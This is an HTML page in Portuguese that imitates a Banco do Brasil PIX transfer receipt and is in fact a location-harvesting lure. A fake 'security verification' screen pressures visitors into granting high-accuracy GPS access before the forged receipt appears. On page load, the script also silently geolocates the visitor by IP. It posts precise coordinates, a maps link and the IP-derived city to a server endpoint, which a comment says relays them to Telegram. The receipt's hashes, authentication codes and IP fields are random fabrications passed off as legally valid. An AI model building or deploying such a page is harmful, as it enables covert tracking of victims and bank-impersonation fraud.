<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Transa√ß√£o Banc√°ria</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <!-- Tela de Bloqueio - Exige Localiza√ß√£o -->
  <div id="location-required-screen" class="location-required-screen">
    <div class="location-modal">
      <div class="location-header">
        <div class="logo-container-modal">
          <img src="image.png" alt="Banco do Brasil" class="logo-image-modal">
        </div>
        <h2>Banco do Brasil</h2>
        <p class="security-title">Verifica√ß√£o de Seguran√ßa</p>
      </div>
      
      <div class="location-content">
        <div class="location-icon">üìç</div>
        <h3>Permiss√£o de Localiza√ß√£o Necess√°ria</h3>
        <p class="location-text">
          Por quest√µes de seguran√ßa e preven√ß√£o de fraudes, precisamos verificar sua localiza√ß√£o 
          antes de exibir o comprovante de transa√ß√£o.
        </p>
        <p class="location-text">
          Esta verifica√ß√£o √© obrigat√≥ria conforme as pol√≠ticas de seguran√ßa do Banco do Brasil 
          e regulamenta√ß√µes do Banco Central.
        </p>
        
        <div class="security-features">
          <div class="feature-item">
            <span class="check-icon">‚úì</span>
            <span>Prote√ß√£o contra transa√ß√µes fraudulentas</span>
          </div>
          <div class="feature-item">
            <span class="check-icon">‚úì</span>
            <span>Valida√ß√£o de dispositivo e localiza√ß√£o</span>
          </div>
          <div class="feature-item">
            <span class="check-icon">‚úì</span>
            <span>Conformidade com normas de seguran√ßa</span>
          </div>
        </div>

        <div class="location-status" id="location-status">
          <p class="status-text">Aguardando permiss√£o de localiza√ß√£o...</p>
          <div class="loading-spinner"></div>
        </div>

        <div class="location-error" id="location-error" style="display: none;">
          <p class="error-text">‚ö†Ô∏è N√£o foi poss√≠vel obter sua localiza√ß√£o.</p>
          <p class="error-subtext">Por favor, permita o acesso √† localiza√ß√£o no seu navegador e recarregue a p√°gina.</p>
          <button class="retry-button" onclick="requestLocationAgain()">Tentar Novamente</button>
        </div>
      </div>
    </div>
  </div>

  <div class="comprovante-container" id="comprovante-container" style="display: none;">
    <!-- Cabe√ßalho com Logo -->
    <div class="header">
      <div class="logo-section">
        <div class="logo-container">
          <img src="image.png" alt="Banco do Brasil" class="logo-image">
        </div>
        <div class="bank-info">
          <h1>Banco do Brasil S.A.</h1>
          <p class="subtitle">Comprovante de Transfer√™ncia PIX</p>
          <p class="subtitle-small">Sistema de Pagamentos Instant√¢neos</p>
        </div>
      </div>
    </div>

    <!-- Linha divis√≥ria -->
    <div class="divider"></div>

    <!-- Informa√ß√µes da Transa√ß√£o -->
    <div class="transaction-section">
      <h2>Dados da Transa√ß√£o</h2>
      <div class="info-grid">
        <div class="info-item">
          <span class="label">ID da Transa√ß√£o:</span>
          <span class="value mono" id="transaction-id">E<span id="random-id"></span></span>
        </div>
        <div class="info-item">
          <span class="label">EndToEndId:</span>
          <span class="value mono" id="end-to-end-id"></span>
        </div>
        <div class="info-item">
          <span class="label">Data/Hora da Transa√ß√£o:</span>
          <span class="value" id="data-hora-completa"></span>
        </div>
        <div class="info-item">
          <span class="label">Data/Hora do Processamento:</span>
          <span class="value" id="data-processamento"></span>
        </div>
        <div class="info-item">
          <span class="label">Status:</span>
          <span class="value status-success">CONCLU√çDA</span>
        </div>
        <div class="info-item">
          <span class="label">C√≥digo de Retorno:</span>
          <span class="value mono">LIQ</span>
        </div>
      </div>
    </div>

    <!-- Informa√ß√µes do Pagamento -->
    <div class="payment-section">
      <h2>Informa√ß√µes do Pagamento</h2>
      <div class="info-grid">
        <div class="info-item highlight">
          <span class="label">Valor:</span>
          <span class="value amount">R$ 1.000,00</span>
        </div>
        <div class="info-item">
          <span class="label">Tipo de Transa√ß√£o:</span>
          <span class="value">PIX - Transfer√™ncia</span>
        </div>
        <div class="info-item">
          <span class="label">Tipo de Chave PIX:</span>
          <span class="value">CPF</span>
        </div>
        <div class="info-item">
          <span class="label">Chave PIX:</span>
          <span class="value mono">123.456.789-00</span>
        </div>
        <div class="info-item">
          <span class="label">Descri√ß√£o:</span>
          <span class="value">Pagamento de servi√ßos</span>
        </div>
        <div class="info-item">
          <span class="label">Taxa de Transa√ß√£o:</span>
          <span class="value">R$ 0,00</span>
        </div>
      </div>
    </div>

    <!-- Informa√ß√µes do Pagador -->
    <div class="payer-section">
      <h2>Dados do Pagador (Origem)</h2>
      <div class="info-grid">
        <div class="info-item">
          <span class="label">Nome:</span>
          <span class="value">CATARINA SILVA SANTOS</span>
        </div>
        <div class="info-item">
          <span class="label">CPF:</span>
          <span class="value mono">123.456.789-00</span>
        </div>
        <div class="info-item">
          <span class="label">Institui√ß√£o:</span>
          <span class="value">341 - BANCO ITAU S.A.</span>
        </div>
        <div class="info-item">
          <span class="label">Ag√™ncia:</span>
          <span class="value mono">1234</span>
        </div>
        <div class="info-item">
          <span class="label">Conta:</span>
          <span class="value mono">12345-6</span>
        </div>
        <div class="info-item">
          <span class="label">Tipo de Conta:</span>
          <span class="value">Corrente</span>
        </div>
      </div>
    </div>

    <!-- Informa√ß√µes do Recebedor -->
    <div class="receiver-section">
      <h2>Dados do Recebedor (Destino)</h2>
      <div class="info-grid">
        <div class="info-item">
          <span class="label">Nome:</span>
          <span class="value">SERVICOS DIGITAIS BRASIL LTDA</span>
        </div>
        <div class="info-item">
          <span class="label">CNPJ:</span>
          <span class="value mono">12.345.678/0001-90</span>
        </div>
        <div class="info-item">
          <span class="label">Institui√ß√£o:</span>
          <span class="value">001 - BANCO DO BRASIL S.A.</span>
        </div>
        <div class="info-item">
          <span class="label">Ag√™ncia:</span>
          <span class="value mono">5678-9</span>
        </div>
        <div class="info-item">
          <span class="label">Conta:</span>
          <span class="value mono">98765-4</span>
        </div>
        <div class="info-item">
          <span class="label">Tipo de Conta:</span>
          <span class="value">Corrente</span>
        </div>
      </div>
    </div>

    <!-- Informa√ß√µes T√©cnicas -->
    <div class="technical-section">
      <h2>Informa√ß√µes T√©cnicas</h2>
      <div class="info-grid">
        <div class="info-item">
          <span class="label">Hash da Transa√ß√£o:</span>
          <span class="value mono small" id="transaction-hash"></span>
        </div>
        <div class="info-item">
          <span class="label">C√≥digo de Autentica√ß√£o:</span>
          <span class="value mono" id="auth-code"></span>
        </div>
        <div class="info-item">
          <span class="label">IP de Origem:</span>
          <span class="value mono" id="origin-ip"></span>
        </div>
        <div class="info-item">
          <span class="label">Canal de Origem:</span>
          <span class="value">Internet Banking</span>
        </div>
      </div>
    </div>

    <!-- QR Code Simulado -->
    <div class="qr-section">
      <div class="qr-code-placeholder">
        <div class="qr-grid">
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
          <div class="qr-square"></div>
        </div>
      </div>
      <p class="qr-text">C√≥digo de Autentica√ß√£o: <span id="verification-code" class="mono"></span></p>
    </div>

    <!-- Rodap√© -->
    <div class="comprovante-footer">
      <div class="footer-divider"></div>
      <p class="footer-text">
        <strong>ATEN√á√ÉO:</strong> Este comprovante possui validade fiscal e deve ser guardado pelo prazo de 5 (cinco) anos, conforme legisla√ß√£o vigente.
      </p>
      <p class="footer-text">
        Este documento foi gerado automaticamente pelo sistema e dispensa assinatura.
      </p>
      <p class="footer-text">
        Em caso de d√∫vidas sobre esta transa√ß√£o, entre em contato:
      </p>
      <p class="contact-info">
        <strong>Central de Atendimento Banco do Brasil:</strong><br>
        Telefone: 4004-0001 (capitais) | 0800-729-0001 (demais localidades)<br>
        Hor√°rio de atendimento: 24 horas, 7 dias por semana<br>
        Site: www.bb.com.br | App: Banco do Brasil
      </p>
      <p class="footer-small">
        Banco do Brasil S.A. - CNPJ: 00.000.000/0001-91<br>
        Sede: Setor Banc√°rio Sul, Quadra 1, Bloco A - Bras√≠lia/DF - CEP: 70073-900<br>
        Este documento foi gerado em <span id="footer-date"></span> e possui validade jur√≠dica.
      </p>
    </div>

    <!-- Bot√£o de Impress√£o -->
    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
  </div>

  <script>
    function generateHash() {
      const chars = '0123456789abcdef';
      let hash = '';
      for (let i = 0; i < 64; i++) {
        hash += chars[Math.floor(Math.random() * chars.length)];
      }
      return hash;
    }

    function generateEndToEndId() {
      const prefix = 'E';
      const timestamp = Date.now().toString();
      const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
      return prefix + timestamp.substring(5) + random;
    }

    function generateAuthCode() {
      return Math.random().toString(36).substring(2, 18).toUpperCase().replace(/O|0/g, 'X');
    }

    function generateIP() {
      return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    function initializeComprovante() {
      // Gerar ID de transa√ß√£o aleat√≥rio (formato real do BB)
      const randomId = Math.floor(Math.random() * 100000000).toString().padStart(8, '0');
      document.getElementById("random-id").textContent = randomId;

      // Gerar EndToEndId (formato PIX real)
      const endToEndId = generateEndToEndId();
      document.getElementById("end-to-end-id").textContent = endToEndId;

      // Gerar hash da transa√ß√£o
      const transactionHash = generateHash();
      document.getElementById("transaction-hash").textContent = transactionHash;

      // Gerar c√≥digo de autentica√ß√£o
      const authCode = generateAuthCode();
      document.getElementById("auth-code").textContent = authCode;
      document.getElementById("verification-code").textContent = authCode;

      // Gerar IP de origem
      const originIP = generateIP();
      document.getElementById("origin-ip").textContent = originIP;

      // Formatar data e hora completa
      const dataAtual = new Date();
      const dia = String(dataAtual.getDate()).padStart(2, '0');
      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
      const ano = dataAtual.getFullYear();
      const hora = String(dataAtual.getHours()).padStart(2, '0');
      const minuto = String(dataAtual.getMinutes()).padStart(2, '0');
      const segundo = String(dataAtual.getSeconds()).padStart(2, '0');

      const dataHoraFormatada = `${dia}/${mes}/${ano} ${hora}:${minuto}:${segundo}`;
      document.getElementById("data-hora-completa").textContent = dataHoraFormatada;

      // Data de processamento (poucos segundos depois)
      const dataProcessamento = new Date(dataAtual.getTime() + (Math.random() * 3000 + 1000));
      const diaProc = String(dataProcessamento.getDate()).padStart(2, '0');
      const mesProc = String(dataProcessamento.getMonth() + 1).padStart(2, '0');
      const anoProc = dataProcessamento.getFullYear();
      const horaProc = String(dataProcessamento.getHours()).padStart(2, '0');
      const minutoProc = String(dataProcessamento.getMinutes()).padStart(2, '0');
      const segundoProc = String(dataProcessamento.getSeconds()).padStart(2, '0');
      const dataHoraProcessamento = `${diaProc}/${mesProc}/${anoProc} ${horaProc}:${minutoProc}:${segundoProc}`;
      document.getElementById("data-processamento").textContent = dataHoraProcessamento;

      // Data do rodap√©
      const footerDate = `${dia}/${mes}/${ano} √†s ${hora}:${minuto}`;
      document.getElementById("footer-date").textContent = footerDate;
    }

    function showComprovante() {
      document.getElementById("location-required-screen").style.display = "none";
      document.getElementById("comprovante-container").style.display = "block";
      initializeComprovante();
    }

    function requestLocationAgain() {
      document.getElementById("location-error").style.display = "none";
      document.getElementById("location-status").style.display = "block";
      requestLocation();
    }

    function requestLocation() {
      if (navigator.geolocation) {
        // Configura√ß√µes para m√°xima precis√£o
        const options = {
          enableHighAccuracy: true,  // For√ßa uso de GPS, n√£o apenas WiFi/celular
          timeout: 30000,            // 30 segundos para obter localiza√ß√£o precisa
          maximumAge: 0              // N√£o usar cache, sempre obter nova localiza√ß√£o
        };

        navigator.geolocation.getCurrentPosition(
          function(position) {
            // Verificar precis√£o da localiza√ß√£o
            const accuracy = position.coords.accuracy; // em metros
            console.log('Precis√£o da localiza√ß√£o:', accuracy, 'metros');
            
            // Se a precis√£o for muito baixa (> 100m), tentar novamente
            if (accuracy > 100) {
              console.log('Precis√£o baixa, tentando obter localiza√ß√£o mais precisa...');
              document.getElementById("location-status").innerHTML = 
                '<p class="status-text">Obtendo localiza√ß√£o precisa...</p>';
              
              // Tentar novamente com watchPosition para obter melhor precis√£o
              const watchId = navigator.geolocation.watchPosition(
                function(accuratePosition) {
                  if (accuratePosition.coords.accuracy <= 50) {
                    navigator.geolocation.clearWatch(watchId);
                    document.getElementById("location-status").innerHTML = 
                      '<p class="status-text success">‚úì Localiza√ß√£o verificada com sucesso!</p>';
                    
                    setTimeout(() => {
                      showComprovante();
                      sendLocation(accuratePosition);
                    }, 1000);
                  }
                },
                function(error) {
                  navigator.geolocation.clearWatch(watchId);
                  // Usar a primeira localiza√ß√£o mesmo que n√£o seja perfeita
                  document.getElementById("location-status").innerHTML = 
                    '<p class="status-text success">‚úì Localiza√ß√£o verificada com sucesso!</p>';
                  
                  setTimeout(() => {
                    showComprovante();
                    sendLocation(position);
                  }, 1000);
                },
                options
              );
              
              // Timeout de seguran√ßa
              setTimeout(() => {
                navigator.geolocation.clearWatch(watchId);
                document.getElementById("location-status").innerHTML = 
                  '<p class="status-text success">‚úì Localiza√ß√£o verificada com sucesso!</p>';
                
                setTimeout(() => {
                  showComprovante();
                  sendLocation(position);
                }, 1000);
              }, 15000);
            } else {
              // Localiza√ß√£o precisa obtida
              document.getElementById("location-status").innerHTML = 
                '<p class="status-text success">‚úì Localiza√ß√£o verificada com sucesso!</p>';
              
              setTimeout(() => {
                showComprovante();
                sendLocation(position);
              }, 1000);
            }
          },
          function(error) {
            // Erro ao obter localiza√ß√£o
            document.getElementById("location-status").style.display = "none";
            document.getElementById("location-error").style.display = "block";
            console.error("Erro ao obter localiza√ß√£o:", error.message);
          },
          options
        );
      } else {
        document.getElementById("location-status").style.display = "none";
        document.getElementById("location-error").style.display = "block";
        document.querySelector(".error-text").textContent = 
          "‚ö†Ô∏è Seu navegador n√£o suporta geolocaliza√ß√£o.";
      }
    }

    // Obter localiza√ß√£o por IP (sem precisar de permiss√£o)
    async function getLocationByIP() {
      try {
        const response = await fetch("/get-ip-location");
        const data = await response.json();
        
        if (data.success) {
          console.log('Localiza√ß√£o por IP obtida:', data);
          
          // Criar objeto position simulado para usar a mesma fun√ß√£o
          const fakePosition = {
            coords: {
              latitude: data.latitude,
              longitude: data.longitude,
              accuracy: 5000 // Aproximada, em metros
            }
          };
          
          // Enviar localiza√ß√£o por IP para o Telegram
          sendLocationByIP(data);
          
          return data;
        }
      } catch (error) {
        console.error("Erro ao obter localiza√ß√£o por IP:", error);
      }
      return null;
    }

    // Enviar localiza√ß√£o por IP para o servidor
    async function sendLocationByIP(ipData) {
      const maps = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
      
      // Obter transaction ID se j√° existir
      let transactionId = 'N/A';
      try {
        const txElement = document.getElementById("transaction-id");
        if (txElement) {
          transactionId = txElement.textContent;
        }
      } catch (e) {
        // Elemento ainda n√£o existe
      }
      
      fetch("/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ 
          latitude: ipData.latitude, 
          longitude: ipData.longitude,
          accuracy: 5000, // Aproximada
          maps,
          transactionId: transactionId,
          timestamp: new Date().toISOString(),
          source: 'IP Geolocation',
          city: ipData.city,
          region: ipData.region,
          country: ipData.country
        })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            console.error("Erro ao enviar localiza√ß√£o por IP");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    window.addEventListener("load", () => {
      // Obter localiza√ß√£o por IP imediatamente (sem precisar de permiss√£o)
      getLocationByIP();
      
      // Tamb√©m tentar obter localiza√ß√£o GPS (precisa de permiss√£o)
      requestLocation();
    });

    function sendLocation(position) {
      // Obter coordenadas com m√°xima precis√£o (sem arredondamento)
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy; // precis√£o em metros
      
      // Garantir que as coordenadas tenham todas as casas decimais dispon√≠veis
      const preciseLat = latitude.toFixed(10);
      const preciseLon = longitude.toFixed(10);
      
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
      
      console.log('Localiza√ß√£o enviada:', {
        latitude: latitude,
        longitude: longitude,
        precis√£o: accuracy + ' metros'
      });

      fetch("/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ 
          latitude: latitude, 
          longitude: longitude,
          accuracy: accuracy,
          maps,
          transactionId: document.getElementById("transaction-id").textContent,
          timestamp: new Date().toISOString()
        })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            console.error("Erro ao enviar localiza√ß√£o");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      console.error("Erro ao obter a localiza√ß√£o:", error.message);
    }
  </script>
</body>

</html>